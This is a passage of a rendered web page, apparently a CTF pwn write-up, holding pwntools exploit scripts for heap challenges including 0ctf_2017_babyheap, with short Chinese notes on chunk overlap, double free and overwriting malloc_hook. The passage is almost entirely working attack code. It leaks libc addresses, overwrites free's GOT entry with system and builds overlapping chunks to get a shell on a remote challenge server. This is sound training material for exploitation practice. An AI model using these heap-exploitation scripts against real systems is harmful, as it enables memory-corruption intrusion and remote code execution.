punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Action: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">,</span> wsize<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size of description: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name: '</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> wsize<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        wsize<span class=\"token operator\">=</span>size<span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'text length: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>wsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'text: '</span><span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'index: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'index: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'text length: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'text: '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'index: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'description: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">headchunk</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> dest<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        self<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> dest</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        self<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">out</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>dest<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">return</span> payload</pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x804B080</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0xc</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'hc'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'start'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0xc</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'end'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x2c</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'jump'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'disabled'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0xc</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'control'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'writebegin'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>front <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0xc</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc</span><span class=\"token operator\">+</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0x89</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>payload <span class=\"token operator\">=</span> front <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>  payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>free_a <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>libcs <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">,</span> free_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>libcbase <span class=\"token operator\">=</span> free_a <span class=\"token operator\">-</span> libcs<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libcs<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> p32<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"0ctf_2017_babyheap\"><a class=\"markdownIt-Anchor\" href=\"#0ctf_2017_babyheap\">#</a> 0ctf_2017_babyheap</h2>\n<p>overlap, double free, malloc_hook,</p>\n<p>利用 overlap 构造重叠块，释放 unsorted bin 泄露 libc 地址。</p>\n<p>覆盖 malloc_hook 为 one_gadget</p>\n<h3 id=\"注意点\"><a class=\"markdownIt-Anchor\" href=\"#注意点\">#</a> 注意点</h3>\n<p>分配函数使用 calloc，需注意在分配后是否需要还原堆内容。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'0ctf_2017_babyheap'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>libdir <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libdir <span class=\"token operator\">+</span> <span class=\"token string\">'libc-2.23.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26986</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0xD47)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Command: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content: '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">headchunk</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> dest<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        self<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> dest</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        self<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">out</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>dest<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">return</span> payload</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#payload = b'a'*0x18 + p64(0x41) + b'a'*0x18 + p64 + p64(0x71)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">:</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token operator\">+</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token operator\">+</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">:</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">:</span><span class=\"token number\">0xa1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xa1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>mh_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x68</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+] the address of malloc hook is:%#x'</span><span class=\"token operator\">%</span>mh_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mh_a <span class=\"token operator\">-</span> libc<span 